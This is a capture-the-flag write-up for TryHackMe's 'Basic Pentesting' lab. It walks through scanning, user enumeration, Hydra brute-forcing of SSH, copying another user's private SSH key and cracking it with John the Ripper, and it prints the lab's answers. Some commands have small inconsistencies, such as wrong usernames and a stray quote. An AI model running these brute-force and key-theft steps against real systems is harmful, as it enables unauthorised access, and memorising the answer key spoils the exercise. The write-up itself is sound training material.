 Writeup: Basic Pentesting ( TryHackMe )

> "The more you explore, the more you learn. Let's get our hands dirty with enumeration and exploitation!"

Welcome to this CTF adventure where we dive deep into the core concepts of hacking: brute forcing, hash cracking, service enumeration, and Linux post-exploitation enumeration. Buckle up, grab a coffee (or Red Bull), and let's get started!

---

 Step 1: Connecting to the Network

First things first, we connect to the target's network using our trusted OpenVPN configuration file:

```
sudo openvpn your-config.ovpn
```

Once connected, you're in the playground. Time to explore!

---

 Step 2: Find the Services

To figure out what services the machine is exposing, we use the powerful Nmap.

 ğŸ›  Tool Spotlight: Nmap

Nmap (Network Mapper) is like sonar for hackers. It scans machines to detect live hosts, open ports, and running services. Super useful to know your entry points.

```
nmap -sV <target-ip>
```

Boom! Nmap tells us that SSH (22) and a web server (80) are open.

---

 Step 3: Discover Hidden Web Directory

We used Dirsearch, a web content scanner, to find hidden paths on the website.

 ğŸ›  Tool Spotlight: Dirsearch

Think of Dirsearch as a nosy neighbor checking every door in your house to see which ones are unlocked. It brute-forces URLs based on a wordlist.

```
dirsearch -u http://<target-ip>
```

We uncover a juicy hidden directory:

```
/development/
```

> ğŸ¯ Answer: development

![Screenshot 2025-07-08 130426](https://github.com/user-attachments/assets/83dbe983-e1fe-4c2e-a2c6-214d200e5c66)

---

 Step 4: Brute Forcing the Login Page

With a login page under `/admin`, we now need credentials. But first, let's see what users are on the machine.

We use enum4linux to enumerate users via SMB:

 ğŸ›  Tool Spotlight: enum4linux

Enum4linux is a Linux tool used to extract information from Windows or Samba systems. Itâ€™s like gossiping with the server â€” you get user lists, shares, and more.

```
enum4linux <target-ip>
```

It returns a possible username:

```
jan
```

> ğŸ§ Answer: jan

![Screenshot 2025-07-08 132718](https://github.com/user-attachments/assets/70fe0413-ec0c-427d-9753-8ab3a5308e21)

Time for Hydra, the beast for brute-forcing:

 ğŸ›  Tool Spotlight: Hydra

Hydra is the brute-forcing Hulk. It tries multiple username-password combinations super fast. Just feed it a wordlist and go!

```bash
hydra -l user1 -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>"
```

Eventually, Hydra cracks the password:

```
armando
```

> ğŸ” Answer: armando

![Screenshot 2025-07-08 133638](https://github.com/user-attachments/assets/3f1bc59d-9813-4942-9c8f-f65d7779eba0)


---

 Step 5: SSH Access

With the credentials in hand, we attempt to login via SSH (thanks, Nmap, for showing us SSH was open):

 ğŸ›  Tool Spotlight: SSH

SSH (Secure Shell) is the front door to a Linux box. If youâ€™ve got the key (username + password), you're in!

```bash
ssh jan@<target-ip>
```

Success!

> ğŸ’» Answer: SSH

---

 Step 6: Privilege Escalation Time!

Inside the machine, we snoop around and discover another user.

Using `enum4linux` again or checking `/home`:

```bash
ls /home
```

We find:

```
kay
```

> ğŸ§â€â™‚ï¸ Answer: kay

 What can you do with this information?

Knowing another user exists gives us a new target to escalate to. We look for weak file permissions, leftover SSH keys, or SUID binaries.

---

 Step 7: Found an SSH Key! ğŸ”‘

Inside the `kay` user's `.ssh` folder:

```bash
ls -la /home/kay/.ssh/id_rsa
```

We find:

```
id_rsa
```

We copy the key content using `nano`:

```
nano id_rsa
```

Save it locally as `h_rsa` and secure it:

```
chmod 600 h_rsa
```

But it's password-protected! Time to crack the SSH private key using John the Ripper.

---

 Step 8: Cracking the RSA Key

We first convert the key into a format John can understand using ssh2john.

 ğŸ›  Tool Spotlight: ssh2john

ssh2john transforms SSH private keys into a format readable by John the Ripper. Think of it as translating a lock into lock-picking instructions.

```bash
ssh2john h_rsa > h.txt
```

Then run John:

 ğŸ›  Tool Spotlight: John the Ripper

John is the password-cracking wizard. Feed it hashes and a wordlist, and it will try everything to break in.

```bash
john h.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Eventually, it reveals:

```
beeswax
```
![Screenshot 2025-07-08 144014](https://github.com/user-attachments/assets/1c9c60c2-ee24-48e9-b9ff-11288d7aa7c8)

We use the key to login:

```bash
ssh -i h_rsa james@<target-ip>
```

> ğŸ§  Final Password: heresareallystrongpasswordthatfollowsthepasswordpolicy$$

![1721177547462](https://github.com/user-attachments/assets/b285f86f-2c99-4e64-9f64-94c1f4bdae67)


---

 ğŸ Conclusion

You've now explored:

 Finding hidden web directories (Dirsearch)
 Enumerating users (Enum4linux)
 Brute-forcing (Hydra)
 Cracking password-protected SSH keys (John + ssh2john)
 Privilege escalation via stolen keys

Every step brought us closer to full access. Remember, enumeration is the key ğŸ”‘ to success in CTFs. Stay curious and hack responsibly!

---

Credits: Inspired by Josiah Pierce (Vulnhub)

Tools Used Recap:

 ğŸ§­ Nmap â€“ find open ports and services
 ğŸ•µï¸â€â™‚ï¸ Dirsearch â€“ scan for hidden web directories
 ğŸ§¾ Enum4linux â€“ enumerate SMB/Windows users
 ğŸ’¥ Hydra â€“ brute-force login credentials
 ğŸ”“ SSH â€“ access remote machines
 ğŸ” ssh2john â€“ convert SSH keys for cracking
 ğŸ§™ John the Ripper â€“ crack hashed passwords

Happy Hacking! ğŸ§‘â€ğŸ’»
